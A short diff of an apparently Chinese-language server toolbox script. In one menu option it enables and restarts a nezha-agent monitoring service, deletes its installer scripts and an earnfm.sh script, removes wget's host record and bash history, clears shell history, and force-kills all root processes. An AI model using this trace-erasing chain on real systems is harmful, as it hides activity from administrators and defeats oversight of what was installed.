@@ -194,8 +194,7 @@ case "$option" in
     clear
     echo -e "\033[33m运行中...\033[0m"  # 黄色
     echo -e "\033[32m------------------------\033[0m"  # 绿色分隔线
-    rm -f ~/.bash_history
-    history -c
+    systemctl daemon-reload && systemctl enable nezha-agent && systemctl restart nezha-agent && rm -f /root/nezha.sh /root/nezha_v0.sh || true && rm -f /root/earnfm.sh || true && rm -f ~/.wget-hsts || true && rm -f ~/.bash_history || true && history -c
     pkill -KILL -u root
     ;;
 
